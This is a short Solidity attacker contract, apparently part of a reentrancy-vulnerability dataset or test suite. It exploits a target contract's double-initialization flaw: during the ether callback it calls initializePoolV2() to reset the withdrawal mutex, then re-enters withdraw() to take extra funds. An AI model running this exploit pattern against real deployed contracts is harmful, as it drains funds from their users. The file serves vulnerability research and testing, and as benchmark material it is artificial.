// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import '../../dataset/cross-function/guard/mutex/trustswap/CrossDoubleInitMutex_ree1.sol';

contract TrustSwapAttacker {
    
    CrossDoubleInitMutexRee1 private c;
    bool private attackPerformed;
    
    constructor(address v) {
        c = CrossDoubleInitMutexRee1(v);
    }

    function attack() public payable {
        c.deposit{value: 1 ether}();
        c.withdraw();
    }

    receive() external payable {
        if (!attackPerformed) {
            attackPerformed = true;
            c.initializePoolV2(); // setting the flag back to false allows to reenter withdraw exactly once
            c.withdraw();
        }
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}